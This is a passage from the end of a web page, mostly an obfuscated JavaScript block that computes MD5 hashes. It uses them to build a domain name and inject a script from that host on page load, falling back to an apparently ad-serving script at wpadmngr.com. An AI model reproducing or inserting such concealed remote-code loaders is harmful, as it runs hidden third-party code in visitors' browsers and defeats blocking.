X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>